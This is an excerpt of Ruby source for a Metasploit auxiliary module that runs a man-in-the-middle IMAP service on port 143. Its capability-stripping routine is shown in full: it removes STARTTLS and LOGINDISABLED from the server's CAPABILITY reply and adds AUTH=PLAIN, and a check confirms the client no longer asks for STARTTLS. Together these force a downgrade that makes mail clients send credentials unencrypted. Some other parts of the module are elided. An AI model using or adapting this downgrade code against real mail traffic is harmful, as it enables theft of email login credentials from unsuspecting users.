...
class Metasploit3 < Msf::Auxiliary
	...
	def initialize(info = {})
		super(update_info(info,
			'Name' => 'imap strip starttls module',
		...
		register_options(
			[
				OptPort.new('SRVPORT', [ true, "service port", 143 ]),
	...
	def on_client_connect(client)
		...
		begin
			...
			if not respdata.index("CAPABILITY").nil?
	...
	def on_client_data(client)
		begin
			...
			if not data.match(/[0-9]+\s+STARTTLS\r\n/).nil?
				perror_exit("Client still requested STARTLS")
	...
	# strips some imap capabilities in place
	def strip_capabilities(data)
		capregex = /(\*\s+)(OK\s+\[?)?CAPABILITY((?:\s+[a-zA-Z0-9\+\-_]{2,})+)(\[?.+\r\n.*)/m
		match = capregex.match(data)
		return data if match.nil?
		# get supported capabilities
		capabilities = match[3].split()
		# replace "blacklisted" capabilities
		blacklistcap = ["LOGINDISABLE", "LOGINDISABLED", "STARTTLS"] 
		blacklistcap.each do |cap|
			capabilities.delete(cap)
		end
		additionalcap = ["AUTH=PLAIN"]
		additionalcap.each do |cap|
			capabilities.push(cap)
		end
	    # actually replace capability string
	    newcapstring = match[1]
	    newcapstring << match[2] if not match[2].nil?
    	newcapstring << "CAPABILITY " 
	    newcapstring << capabilities.join(" ")
    	newcapstring << match[4] if not match[4].nil?
	    return newcapstring
	end
